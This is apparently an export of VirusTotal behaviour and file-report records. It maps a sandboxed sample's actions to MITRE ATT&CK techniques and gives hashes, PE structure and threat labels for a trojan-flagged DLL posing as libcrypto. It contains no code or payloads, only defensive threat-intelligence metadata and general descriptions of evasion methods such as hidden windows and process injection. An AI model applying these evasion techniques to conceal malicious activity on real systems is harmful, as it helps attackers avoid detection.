                "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Hides that the sample has been downloaded from the Internet (zone.identifier)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1564/001/",
                "id": "T1564.001",
                "name": "Hidden Files and Directories"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates a DirectInput object (often for capturing keystrokes)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/",
                "id": "T1056",
                "name": "Input Capture"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "id": "TA0006",
            "name": "Credential Access"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Injects a PE file into a foreign processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Uses schtasks.exe or at.exe to add and modify task schedules"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/",
                "id": "T1053",
                "name": "Scheduled Task/Job"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "Yomi Hunter": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process attempted to dynamically load a malicious function"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "The process tried to load dynamically one or more functions."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process has tried to detect the debugger probing the use of page guards."
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "The process attempted to detect a running debugger using common APIs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Detected an attempt to delete a file downloaded from Internet"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1070/",
                "id": "T1070",
                "name": "Indicator Removal"
              },
              {
                "description": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows copy /b command to reassemble binary fragments into a malicious payload.\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Detected an attempt to pull out some data from the binary image"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1140/",
                "id": "T1140",
                "name": "Deobfuscate/Decode Files or Information"
              },
              {
                "description": "Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to Subvert Trust Controls by not impacting execution controls such as digital signatures and notarization tickets. \nAdversaries may embed payloads in various file formats to hide payloads. This is similar to Steganography, though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats. \nFor example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary. Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format. \nEmbedded content may also be used as Process Injection payloads used to infect benign system processes. These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Drops interesting files and uses them"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/009/",
                "id": "T1027.009",
                "name": "Embedded Payloads"
              },
              {
                "description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \nOn Windows, there are a variety of features in scripting languages in Windows, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is powershell.exe -WindowStyle Hidden. \nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Detected the creation of a hidden window (common execution hiding technique)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1564/003/",
                "id": "T1564.003",
                "name": "Hidden Window"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/dfb9b3c7cf15baa877da2d2c87e1e53761517094bab2de1a6b92ebca122fa858/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "6596a5b506bafd61c48fcc59"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 DLL",
      "tlsh": "T1546612C36C6BF93AF3C69574BB33CC19C439162913189B9D0BE485452CFB62C85A8D9B",
      "vhash": "1660c6655d15551515501028z5oz1cz11z",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "pedll"
      ],
      "creation_date": 1697273991,
      "names": [
        "libcrypto-3-zm.dll"
      ],
      "last_modification_date": 1703508262,
      "type_tag": "pedll",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 6808576,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.doina/khalesi",
        "popular_threat_category": [
          {
            "count": 24,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 7,
            "value": "doina"
          },
          {
            "count": 5,
            "value": "khalesi"
          },
          {
            "count": 3,
            "value": "nrbx"
          }
        ]
      },
      "authentihash": "e42756f05a2730e80516f4572ab0170b83d158eee1bb34a6f1a6cccbf2c0a97e",
      "detectiteasy": {
        "filetype": "PE64",
        "values": [
          {
            "version": "2015 v.14.0",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "version": "16.00",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "info": "DLL64",
            "version": "14.0",
            "type": "Linker",
            "name": "Microsoft Linker"
          }
        ]
      },
      "last_submission_date": 1699334676,
      "sigma_analysis_results": [
        {
          "rule_title": "DMP/HDMP File Creation",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "11",
                "ProcessId": "3276",
                "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WER4FEB.tmp.dmp",
                "ProcessGuid": "{C784477D-CAF3-6549-3206-000000004800}",
                "CreationUtcTime": "1699334899",
                "UtcTime": "1699334899",
                "RuleName": "-",
                "Image": "C:\\Windows\\SysWOW64\\WerFault.exe"
              }
            }
          ],
          "rule_level": "low",
          "rule_description": "Detects the creation of a file with the \".dmp\"/\".hdmp\" extension. Often created by software during a crash. Memory dumps can sometimes contain sensitive information such as credentials. It's best to determine the source of the crash.",
          "rule_author": "Nasreddine Bencherchali (Nextron Systems)",
          "rule_id": "67ee86b34b3617ea45dec0ef09b7a71a5f44f5c010ccc9139d92f49685996f49"
        }
      ],
      "meaningful_name": "libcrypto-3-zm.dll",
      "trid": [
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 63.5
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 12.2
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 12
        },
        {
          "file_type": "DOS Executable Generic",
          "probability": 12
        }
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 0,
          "medium": 0,
          "critical": 0,
          "low": 1
        }
      },
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "malicious",
          "confidence": 68,
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "MALWARE",
            "STEALER",
            "TROJAN"
          ]
        },
        "C2AE": {
          "category": "undetected",
          "sandbox_name": "C2AE",
          "malware_classification": [
            "UNKNOWN_VERDICT"
          ]
        }
      },
      "sha256": "30fda67726f77706955f6b52b202452e91d5ff132783854eec63e809061a4b5c",
      "type_extension": "dll",
      "tags": [
        "service-scan",
        "detect-debug-environment",
        "spreader",
        "checks-user-input",
        "64bits",
        "pedll"
      ],
      "last_analysis_date": 1703499826,
      "unique_sources": 1,
      "first_submission_date": 1699334676,
      "sha1": "afcb6d65145288d8d8397c006c837dcf176dba01",
      "ssdeep": "196608:St1CPwDvt3uF+DCbQ9SD2y4qpAbHH2A/AAWv7V9IOPkUomJXyTrOMD+hIqwDTM4/:Y1CPwDvt3uFECbQ9SD2y4qpA6kCjV9B8",
      "md5": "174ff2e9b7a6b77382a5de6cf6f8a877",
      "pe_info": {
        "exports": [
          "ACCESS_DESCRIPTION_free",
          "ACCESS_DESCRIPTION_it",
          "ACCESS_DESCRIPTION_new",
          "ADMISSIONS_free",
          "ADMISSIONS_get0_admissionAuthority",
          "ADMISSIONS_get0_namingAuthority",
          "ADMISSIONS_get0_professionInfos",
          "ADMISSIONS_it",
          "ADMISSIONS_new",
          "ADMISSIONS_set0_admissionAuthority",
          "ADMISSIONS_set0_namingAuthority",
          "ADMISSIONS_set0_professionInfos",
          "ADMISSION_SYNTAX_free",
          "ADMISSION_SYNTAX_get0_admissionAuthority",
          "ADMISSION_SYNTAX_get0_contentsOfAdmissions",
          "ADMISSION_SYNTAX_it",
          "ADMISSION_SYNTAX_new",
          "ADMISSION_SYNTAX_set0_admissionAuthority",
          "ADMISSION_SYNTAX_set0_contentsOfAdmissions",
          "AES_bi_ige_encrypt",
          "AES_cbc_encrypt",
          "AES_cfb128_encrypt",
          "AES_cfb1_encrypt",
          "AES_cfb8_encrypt",
          "AES_decrypt",
          "AES_ecb_encrypt",
          "AES_encrypt",
          "AES_ige_encrypt",
          "AES_ofb128_encrypt",
          "AES_options",
          "AES_set_decrypt_key",
          "AES_set_encrypt_key",
          "AES_unwrap_key",
          "AES_wrap_key",
          "ASIdOrRange_free",
          "ASIdOrRange_it",
          "ASIdOrRange_new",
          "ASIdentifierChoice_free",
          "ASIdentifierChoice_it",
          "ASIdentifierChoice_new",
          "ASIdentifiers_free",
          "ASIdentifiers_it",
          "ASIdentifiers_new",
          "ASN1_ANY_it",
          "ASN1_BIT_STRING_check",
          "ASN1_BIT_STRING_free",
          "ASN1_BIT_STRING_get_bit",
          "ASN1_BIT_STRING_it",
          "ASN1_BIT_STRING_name_print",
          "ASN1_BIT_STRING_new",
          "ASN1_BIT_STRING_num_asc",
          "ASN1_BIT_STRING_set",
          "ASN1_BIT_STRING_set_asc",
          "ASN1_BIT_STRING_set_bit",
          "ASN1_BMPSTRING_free",
          "ASN1_BMPSTRING_it",
          "ASN1_BMPSTRING_new",
          "ASN1_BOOLEAN_it",
          "ASN1_ENUMERATED_free",
          "ASN1_ENUMERATED_get",
          "ASN1_ENUMERATED_get_int64",
          "ASN1_ENUMERATED_it",
          "ASN1_ENUMERATED_new",
          "ASN1_ENUMERATED_set",
          "ASN1_ENUMERATED_set_int64",
          "ASN1_ENUMERATED_to_BN",
          "ASN1_FBOOLEAN_it",
          "ASN1_GENERALIZEDTIME_adj",
          "ASN1_GENERALIZEDTIME_check",
          "ASN1_GENERALIZEDTIME_dup",
          "ASN1_GENERALIZEDTIME_free",
          "ASN1_GENERALIZEDTIME_it",
          "ASN1_GENERALIZEDTIME_new",
          "ASN1_GENERALIZEDTIME_print",
          "ASN1_GENERALIZEDTIME_set",
          "ASN1_GENERALIZEDTIME_set_string",
          "ASN1_GENERALSTRING_free",
          "ASN1_GENERALSTRING_it",
          "ASN1_GENERALSTRING_new",
          "ASN1_IA5STRING_free",
          "ASN1_IA5STRING_it",
          "ASN1_IA5STRING_new",
          "ASN1_INTEGER_cmp",
          "ASN1_INTEGER_dup",
          "ASN1_INTEGER_free",
          "ASN1_INTEGER_get",
          "ASN1_INTEGER_get_int64",
          "ASN1_INTEGER_get_uint64",
          "ASN1_INTEGER_it",
          "ASN1_INTEGER_new",
          "ASN1_INTEGER_set",
          "ASN1_INTEGER_set_int64",
          "ASN1_INTEGER_set_uint64",
          "ASN1_INTEGER_to_BN",
          "ASN1_ITEM_get",
          "ASN1_ITEM_lookup",
          "ASN1_NULL_free",
          "ASN1_NULL_it",
          "ASN1_NULL_new",
          "ASN1_OBJECT_create",
          "ASN1_OBJECT_free",
          "ASN1_OBJECT_it",
          "ASN1_OBJECT_new",
          "ASN1_OCTET_STRING_NDEF_it",
          "ASN1_OCTET_STRING_cmp",
          "ASN1_OCTET_STRING_dup",
          "ASN1_OCTET_STRING_free",
          "ASN1_OCTET_STRING_it",
          "ASN1_OCTET_STRING_new",
          "ASN1_OCTET_STRING_set",
          "ASN1_PCTX_free",
          "ASN1_PCTX_get_cert_flags",
          "ASN1_PCTX_get_flags",
          "ASN1_PCTX_get_nm_flags",
          "ASN1_PCTX_get_oid_flags",
          "ASN1_PCTX_get_str_flags",
          "ASN1_PCTX_new",
          "ASN1_PCTX_set_cert_flags",
          "ASN1_PCTX_set_flags",
          "ASN1_PCTX_set_nm_flags",
          "ASN1_PCTX_set_oid_flags",
          "ASN1_PCTX_set_str_flags",
          "ASN1_PRINTABLESTRING_free",
          "ASN1_PRINTABLESTRING_it",
          "ASN1_PRINTABLESTRING_new",
          "ASN1_PRINTABLE_free",
          "ASN1_PRINTABLE_it",
          "ASN1_PRINTABLE_new",
          "ASN1_PRINTABLE_type",
          "ASN1_SCTX_free",
          "ASN1_SCTX_get_app_data",
          "ASN1_SCTX_get_flags",
          "ASN1_SCTX_get_item",
          "ASN1_SCTX_get_template",
          "ASN1_SCTX_new",
          "ASN1_SCTX_set_app_data",
          "ASN1_SEQUENCE_ANY_it",
          "ASN1_SEQUENCE_it",
          "ASN1_SET_ANY_it",
          "ASN1_STRING_TABLE_add",
          "ASN1_STRING_TABLE_cleanup",
          "ASN1_STRING_TABLE_get",
          "ASN1_STRING_clear_free",
          "ASN1_STRING_cmp",
          "ASN1_STRING_copy",
          "ASN1_STRING_data",
          "ASN1_STRING_dup",
          "ASN1_STRING_free",
          "ASN1_STRING_get0_data",
          "ASN1_STRING_get_default_mask",
          "ASN1_STRING_length",
          "ASN1_STRING_length_set",
          "ASN1_STRING_new",
          "ASN1_STRING_print",
          "ASN1_STRING_print_ex",
          "ASN1_STRING_print_ex_fp",
          "ASN1_STRING_set",
          "ASN1_STRING_set0",
          "ASN1_STRING_set_by_NID",
          "ASN1_STRING_set_default_mask",
          "ASN1_STRING_set_default_mask_asc",
          "ASN1_STRING_to_UTF8",
          "ASN1_STRING_type",
          "ASN1_STRING_type_new",
          "ASN1_T61STRING_free",
          "ASN1_T61STRING_it",
          "ASN1_T61STRING_new",
          "ASN1_TBOOLEAN_it",
          "ASN1_TIME_adj",
          "ASN1_TIME_check",
          "ASN1_TIME_cmp_time_t",
          "ASN1_TIME_compare",
          "ASN1_TIME_diff",
          "ASN1_TIME_dup",
          "ASN1_TIME_free",
          "ASN1_TIME_it",
          "ASN1_TIME_new",
          "ASN1_TIME_normalize",
          "ASN1_TIME_print",
          "ASN1_TIME_print_ex",
          "ASN1_TIME_set",
          "ASN1_TIME_set_string",
          "ASN1_TIME_set_string_X509",
          "ASN1_TIME_to_generalizedtime",
          "ASN1_TIME_to_tm",
          "ASN1_TYPE_cmp",
          "ASN1_TYPE_free",
          "ASN1_TYPE_get",
          "ASN1_TYPE_get_int_octetstring",
          "ASN1_TYPE_get_octetstring",
          "ASN1_TYPE_new",
          "ASN1_TYPE_pack_sequence",
          "ASN1_TYPE_set",
          "ASN1_TYPE_set1",
          "ASN1_TYPE_set_int_octetstring",
          "ASN1_TYPE_set_octetstring",
          "ASN1_TYPE_unpack_sequence",
          "ASN1_UNIVERSALSTRING_free",
          "ASN1_UNIVERSALSTRING_it",
          "ASN1_UNIVERSALSTRING_new",
          "ASN1_UNIVERSALSTRING_to_string",
          "ASN1_UTCTIME_adj",
          "ASN1_UTCTIME_check",
          "ASN1_UTCTIME_cmp_time_t",
          "ASN1_UTCTIME_dup",
          "ASN1_UTCTIME_free",
          "ASN1_UTCTIME_it",
          "ASN1_UTCTIME_new",
          "ASN1_UTCTIME_print",
          "ASN1_UTCTIME_set",
          "ASN1_UTCTIME_set_string",
          "ASN1_UTF8STRING_free",
          "ASN1_UTF8STRING_it",
          "ASN1_UTF8STRING_new",
          "ASN1_VISIBLESTRING_free",
          "ASN1_VISIBLESTRING_it",
          "ASN1_VISIBLESTRING_new",
          "ASN1_add_oid_module",
          "ASN1_add_stable_module",
          "ASN1_bn_print",
          "ASN1_buf_print",
          "ASN1_check_infinite_end",
          "ASN1_const_check_infinite_end",
          "ASN1_d2i_bio",
          "ASN1_d2i_fp",
          "ASN1_digest",
          "ASN1_dup",
          "ASN1_generate_nconf",
          "ASN1_generate_v3",
          "ASN1_get_object",
          "ASN1_i2d_bio",
          "ASN1_i2d_fp",
          "ASN1_item_d2i",
          "ASN1_item_d2i_bio",
          "ASN1_item_d2i_bio_ex",
          "ASN1_item_d2i_ex",
          "ASN1_item_d2i_fp",
          "ASN1_item_d2i_fp_ex",
          "ASN1_item_digest",
          "ASN1_item_dup",
          "ASN1_item_ex_d2i",
          "ASN1_item_ex_free",
          "ASN1_item_ex_i2d",
          "ASN1_item_ex_new",
          "ASN1_item_free",
          "ASN1_item_i2d",
          "ASN1_item_i2d_bio",
          "ASN1_item_i2d_fp",
          "ASN1_item_i2d_mem_bio",
          "ASN1_item_ndef_i2d",
          "ASN1_item_new",
          "ASN1_item_new_ex",
          "ASN1_item_pack",
          "ASN1_item_print",
          "ASN1_item_sign",
          "ASN1_item_sign_ctx"
        ],
        "resource_details": [
          {
            "lang": "NEUTRAL",
            "entropy": 4.8402252197265625,
            "chi2": 243.07,
            "filetype": "unknown",
            "sha256": "d2690c6e40b26f66c9f82e0a3a55261be954f778abf84dd16ac33207d8659349",
            "type": "RT_RCDATA"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.999967575073242,
            "chi2": 300.85,
            "filetype": "unknown",
            "sha256": "448b0f1a1665dd42ea20c9c4a09390489803d63f7e080dcd0ae0d87edc2c16db",
            "type": "RT_RCDATA"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 4.7120771408081055,
            "chi2": 4295.3,
            "filetype": "XML",
            "sha256": "6f88bc7cb02ccb2dbc26b5f4ce53e355b331e31bb920b2ba8cbbcd1b5d4cd5a0",
            "type": "RT_MANIFEST"
          }
        ],
        "resource_types": {
          "RT_RCDATA": 2,
          "RT_MANIFEST": 1
        },
        "imphash": "12c2b2e895adbc4deeb868d8e5cf3d0d",
        "resource_langs": {
          "NEUTRAL": 2,
          "ENGLISH US": 1
        },
        "machine_type": 34404,
        "timestamp": 1697273991,
        "entry_point": 18572,
        "sections": [
          {
            "name": ".text",
            "chi2": 391575.09,
            "virtual_address": 4096,
            "entropy": 6.56,
            "raw_size": 68608,
            "flags": "rx",
            "virtual_size": 68178,
            "md5": "ef9717cd446c9b28ce91dfe091cb0475"
          },
          {
            "name": ".rdata",
            "chi2": 2744193.25,
            "virtual_address": 73728,
            "entropy": 5.96,
            "raw_size": 398336,
            "flags": "r",
            "virtual_size": 398028,
            "md5": "54090a6b5f4c6e4255b515faacce6c00"
          },
          {
            "name": ".data",
            "chi2": 490553.19,
            "virtual_address": 475136,
            "entropy": 1.9,
            "raw_size": 3072,
            "flags": "rw",
            "virtual_size": 7488,
            "md5": "45b003d89c140252d0dca9c29eeda752"
          },
          {
            "name": ".pdata",
            "chi2": 235371.2,
            "virtual_address": 483328,
            "entropy": 4.82,
            "raw_size": 4608,
            "flags": "r",
            "virtual_size": 4224,
            "md5": "66d996de69486408c2ef16800fb70d92"
          },
          {
            "name": ".00cfg",
            "chi2": 119114,
            "virtual_address": 491520,
            "entropy": 0.37,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 48,
            "md5": "dc334965e633d5796809f63a291a9ff2"
          },
          {
            "name": ".gehcont",
            "chi2": 122015,
            "virtual_address": 495616,
            "entropy": 0.33,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 48,
            "md5": "81aa1338a6062fb26ce0845d597e5650"
          },
          {
            "name": ".gxfg",
            "chi2": 208180,
            "virtual_address": 499712,
            "entropy": 4.94,
            "raw_size": 4096,
            "flags": "r",
            "virtual_size": 3952,
            "md5": "04e6e1dc4f48bde0fba6fd293efec618"
          },
          {
            "virtual_address": 503808,
            "entropy": 1.05,
            "name": ".retplne",
            "raw_size": 512,
            "chi2": 99980,
            "virtual_size": 140,
            "md5": "8c950f651287cbc1296bcb4e8cd7e990"
          },
          {
            "virtual_address": 507904,
            "entropy": 0.82,
            "name": ".voltbl",
            "raw_size": 512,
            "chi2": 109972,
            "virtual_size": 48,
            "md5": "53cff37f5e5f325ed6b5279d0f1c2634"
          },
          {
            "name": "_RDATA",
            "chi2": 77087,
            "virtual_address": 512000,
            "entropy": 1.97,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 244,
            "md5": "f8eb86401d7b574648f66edbe2920fd7"
          },
          {
            "name": ".rsrc",
            "chi2": 302.27,
            "virtual_address": 516096,
            "entropy": 8,
            "raw_size": 6324224,
            "flags": "r",
            "virtual_size": 6323804,
            "md5": "b6f085fcf7d74e9895786d9b7fc2546d"
          },
          {
            "name": ".reloc",
            "chi2": 37034,
            "virtual_address": 6840320,
            "entropy": 4.89,
            "raw_size": 2048,
            "flags": "r",
            "virtual_size": 1608,
            "md5": "a3746b46b5577d991b224a95e77c06a4"
          }
        ],
        "import_list": [
          {
            "library_name": "ADVAPI32.dll",
            "imported_functions": [
              "GetTokenInformation",
              "OpenProcessToken"
            ]
          },
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "CloseHandle",
              "CreateFileW",
              "CreateMutexW",
              "CreateProcessW",
              "DeleteCriticalSection",
              "DeleteFileW",
              "EncodePointer",
              "EnterCriticalSection",
              "ExitProcess",
              "FindClose",
              "FindFirstFileExW",
              "FindNextFileW",
              "FlsAlloc",
              "FlsFree",
              "FlsGetValue",
              "FlsSetValue",
              "FlushFileBuffers",
              "FreeEnvironmentStringsW",
              "FreeLibrary",
              "GetACP",
              "GetCommandLineA",
              "GetCommandLineW",
              "GetConsoleMode",
              "GetConsoleOutputCP",
              "GetCPInfo",
              "GetCurrentProcess",
              "GetCurrentProcessId",
              "GetCurrentThreadId",
              "GetEnvironmentStringsW",
              "GetFileType",
              "GetLastError",
              "GetModuleFileNameW",
              "GetModuleHandleExW",
              "GetModuleHandleW",
              "GetOEMCP",
              "GetProcAddress",
              "GetProcessHeap",
              "GetStartupInfoW",
              "GetStdHandle",
              "GetStringTypeW",
              "GetSystemTimeAsFileTime",
              "GetTempPathW",
              "HeapAlloc",
              "HeapFree",
              "HeapReAlloc",
              "HeapSize",
              "InitializeCriticalSectionAndSpinCount",
              "InitializeSListHead",
              "InterlockedFlushSList",
              "IsDebuggerPresent",
              "IsProcessorFeaturePresent",
              "IsValidCodePage",
              "LCMapStringW",
              "LeaveCriticalSection",
              "LoadLibraryExW",
              "lstrcatW",
              "lstrlenA",
              "MultiByteToWideChar",
              "QueryPerformanceCounter",
              "RaiseException",
